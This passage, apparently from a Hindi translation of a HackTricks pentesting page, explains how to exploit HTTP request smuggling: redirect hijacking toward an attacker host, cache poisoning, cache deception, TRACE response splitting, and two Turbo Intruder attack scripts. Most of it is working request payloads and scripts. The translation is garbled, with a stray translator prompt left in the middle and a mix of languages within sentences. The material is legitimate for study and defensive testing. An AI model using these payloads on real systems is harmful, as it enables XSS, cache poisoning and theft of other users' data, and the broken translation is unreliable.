> यदि user content किसी response में **`Content-type`** जैसे **`text/plain`** के साथ reflect होता है, तो XSS की execution रोकी जा सकती है। यदि server **HTTP/0.9** को support करता है तो इसे bypass करना संभव हो सकता है!

HTTP/0.9 version 1.0 से पहले की थी और यह केवल **GET** verbs का उपयोग करती है और **headers** के साथ respond नहीं करती, केवल body भेजती है।

इस [**this writeup**](https://mizu.re/post/twisty-python) में, इसे request smuggling के साथ abused किया गया था और एक **vulnerable endpoint जो user के input के साथ reply करेगा** का इस्तेमाल करके HTTP/0.9 के साथ request smuggle करने में दुरुपयोग किया गया था। Response में जो parameter reflect होगा, उसमें एक **fake HTTP/1.1 response (with headers and body)** शामिल था, इसलिए response में `Content-Type` `text/html` के साथ valid executable JS code होगा।

### Exploiting On-site Redirects with HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Applications अक्सर redirect करते हैं एक URL से दूसरे URL पर, redirect URL में hostname के लिए `Host` header का उपयोग करके। यह Apache और IIS जैसे web servers में सामान्य है। उदाहरण के लिए, किसी फोल्डर का request बिना trailing slash के करने पर redirect होता है ताकि slash शामिल हो:
```
GET /home HTTP/1.1
Host: normal-website.com
```
परिणाम:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
हालाँकि दिखाई देने में हानिरहित, इस व्यवहार को HTTP request smuggling का उपयोग करके उपयोगकर्ताओं को किसी बाहरी साइट पर redirect करने के लिए हेरफेर किया जा सकता है। उदाहरण के लिए:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
यह smuggled request अगले प्रसंस्कृत उपयोगकर्ता अनुरोध को attacker-controlled वेबसाइट पर रीडायरेक्ट कर सकता है:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
इसके परिणामस्वरूप:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the user by serving malicious JavaScript in response.

### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning तब किया जा सकता है अगर कोई भी component of the **front-end infrastructure caches content**, सामान्यतः प्रदर्शन बढ़ाने के लिए। सर्वर की प्रतिक्रिया को हेरफेर करके, **poison the cache** करना संभव है।

पहले हमने देखा कि कैसे सर्वर प्रतिक्रियाओं को बदलकर 404 error लौटाया जा सकता है (देखें [Basic Examples](#basic-examples)). इसी तरह, यह संभव है कि सर्वर को ठगा जाए और किसी अनुरोध के जवाब में `/index.html` सामग्री `/static/include.js` के अनुरोध के लिए दी जाए। परिणामस्वरूप, `/static/include.js` की सामग्री cache में `/index.html` की सामग्री से बदल दी जाती है, जिससे `/static/include.js` उपयोगकर्ताओं के लिए अनुपलब्ध हो जाता है और संभावित रूप से Denial of Service (DoS) का कारण बन सकता है।

यह technique विशेष रूप से खतरनाक हो जाती है यदि कोई **Open Redirect vulnerability** खोज ली जाए या साइट के भीतर किसी **on-site redirect to an open redirect** मौजूद हो। ऐसी कमजोरियों का उपयोग करके `/static/include.js` की cache की हुई सामग्री को attacker के नियंत्रण वाले स्क्रिप्ट से बदल दिया जा सकता है, जिससे उन सभी क्लाइंट्स के खिलाफ व्यापक Cross-Site Scripting (XSS) हमला संभव हो जाता है जो अपडेट की गई `/static/include.js` का अनुरोध करते हैं।

नीचे **cache poisoning combined with an on-site redirect to open redirect** का शोषण करने का एक उदाहरण दिया गया है। उद्देश्य `/static/include.js` के cache कंटेंट को बदलकर attacker द्वारा नियंत्रित JavaScript सर्व करना है:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
ध्यान दें कि एम्बेडेड रिक्वेस्ट `/post/next?postId=3` को लक्षित कर रही है। यह रिक्वेस्ट `/post?postId=4` पर रीडायरेक्ट हो जाएगी, डोमेन निर्धारित करने के लिए **Host header value** का उपयोग करते हुए। **Host header** को बदलकर, attacker अपनी डोमेन पर रिक्वेस्ट रीडायरेक्ट कर सकता है (**on-site redirect to open redirect**)।

सफल **socket poisoning** के बाद, `/static/include.js` के लिए एक **GET request** शुरू की जानी चाहिए। यह रिक्वेस्ट पहले की हुई **on-site redirect to open redirect** रिक्वेस्ट से संदूषित हो जाएगी और attacker द्वारा नियंत्रित स्क्रिप्ट की सामग्री प्राप्त करेगी।

इसके बाद, `/static/include.js` के लिए कोई भी रिक्वेस्ट attacker के स्क्रिप्ट की कैश्ड सामग्री सर्व करेगी, जिससे प्रभावी रूप से एक व्यापक XSS attack लॉन्च हो जाएगा।

### HTTP request smuggling का उपयोग करके web cache deception करना <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **web cache poisoning और web cache deception में क्या अंतर है?**
>
> - **web cache poisoning** में, attacker एप्लिकेशन को cache में कुछ दुर्भावनापूर्ण सामग्री स्टोर कराने के लिए प्रेरित करता है, और यह सामग्री cache से अन्य एप्लिकेशन उपयोगकर्ताओं को सर्व की जाती है।
> - **web cache deception** में, attacker एप्लिकेशन को किसी अन्य उपयोगकर्ता की कुछ संवेदनशील सामग्री cache में स्टोर करवा देता है, और फिर attacker उस सामग्री को cache से प्राप्त कर लेता है।

attacker एक smuggled request तैयार करता है जो संवेदनशील user-विशिष्ट सामग्री को प्राप्त करती है। निम्नलिखित उदाहरण पर विचार करें:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
यदि यह smuggled request किसी static content (उदा., `/someimage.png`) के लिए बने cache entry को poison कर दे, तो victim का संवेदनशील डेटा `/private/messages` उस static content के cache entry के तहत cached हो सकता है। परिणामस्वरूप, attacker संभवतः इन cached संवेदनशील डेटा को पुनः प्राप्त कर सकता है।

### TRACE का दुरुपयोग HTTP Request Smuggling के माध्यम से <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) में सुझाया गया है कि यदि सर्वर पर method TRACE सक्रिय है तो इसे HTTP Request Smuggling के साथ दुरुपयोग किया जा सकता है। ऐसा इसलिए है क्योंकि यह method सर्वर को भेजे गए किसी भी header को response के body के हिस्से के रूप में reflect कर देगा। उदाहरण के लिए:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Please paste the contents of src/pentesting-web/http-request-smuggling/README.md (exact markdown). I will translate the English text to Hindi while preserving code, links, tags and paths.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
इस व्यवहार का दुरुपयोग करने का एक उदाहरण होगा कि **smuggle first a HEAD request**. This request का response केवल GET request के **headers** होंगे (जिनमें **`Content-Type`** शामिल है). और **immediately after the HEAD a TRACE request** को smuggle करें, जो भेजे गए डेटा को reflect करेगा.\
चूँकि HEAD response में एक `Content-Length` header होगा, поэтому **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** response में arbitrary डेटा को प्रतिबिंबित करेगा.\
यह response connection पर अगले request को भेज दिया जाएगा, इसलिए इसे **used in a cached JS file for example to inject arbitrary JS code** के लिए उपयोग किया जा सकता है।

### TRACE का दुरुपयोग के माध्यम से HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**this post**](https://portswigger.net/research/trace-desync-attack) पढ़ने की सलाह दी जाती है — इसमें TRACE method का दुरुपयोग करने का एक और तरीका बताया गया है। जैसा कि बताया गया है, एक HEAD request और एक TRACE request smuggle करके, HEAD request के response में कुछ reflected डेटा को नियंत्रित करना संभव है। HEAD request के body की लंबाई मूलतः `Content-Length` header में दर्शाई जाती है और यह TRACE request के response से बनती है। 

इसलिए, नई सोच यह है कि, इस `Content-Length` और TRACE response में दिए गए data को जानकर, संभव है कि TRACE response में `Content-Length` के अंतिम बाइट के बाद एक valid HTTP response शामिल कर दिया जाए, जिससे हमलावर अगले response के लिए भेजे जाने वाले request को पूरी तरह नियंत्रित कर सके (जिसे cache poisoning को अंजाम देने के लिए use किया जा सकता है)।

उदाहरण:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
ये responses उत्पन्न होंगे (ध्यान दें कि HEAD response में Content-Length होने के कारण TRACE response HEAD बॉडी का हिस्सा बन जाता है और जैसे ही HEAD का Content-Length समाप्त होता है, एक वैध HTTP response smuggled हो जाता है):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### HTTP Request Smuggling को HTTP Response Desynchronisation के साथ हथियार बनाना

क्या आपने कोई HTTP Request Smuggling vulnerability पाया है और आप नहीं जानते कि इसे कैसे exploit किया जाए? इन अन्य exploitation तरीकों को आज़माएँ:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### अन्य HTTP Request Smuggling तकनीकें

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder scripts

### CL.TE

स्रोत: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

स्रोत: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## उपकरण

- HTTP Hacker (Burp BApp Store) – concatenation/framing और low‑level HTTP व्यवहार को visualize करने के लिए
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): यह टूल एक grammar-based HTTP Fuzzer है जो विचित्र request smuggling विसंगतियाँ खोजने में उपयोगी है।

## संदर्भ

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- False false‑positive से सावधान रहें: HTTP pipelining और request smuggling को अलग कैसे करें – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)


{{#include ../../banners/hacktricks-training.md}}
